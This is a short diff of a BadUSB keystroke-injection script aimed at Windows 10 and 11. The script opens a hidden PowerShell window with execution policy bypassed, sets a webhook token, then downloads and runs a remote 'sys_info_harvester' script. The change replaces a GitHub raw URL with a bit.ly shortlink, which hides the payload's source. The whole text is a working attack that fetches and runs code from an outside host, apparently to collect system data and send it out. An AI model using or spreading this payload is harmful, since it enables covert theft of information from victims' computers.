@@ -5,5 +5,5 @@ REM Target: Windows 10, 11
 
 GUI r
 DELAY 250
-STRING powershell -w h -NoP -Ep Bypass $dc='insert webhook access token';iwr raw.githubusercontent.com/ibeihoffer/Bad-USB/main/Windows_Payloads/Sys_Info_Harvester/sys_info_harvester.ps1 | iex
+STRING powershell -w h -NoP -Ep Bypass $dc='insert webhook access token';irm bit.ly/sys_info_harvester | iex
 ENTER
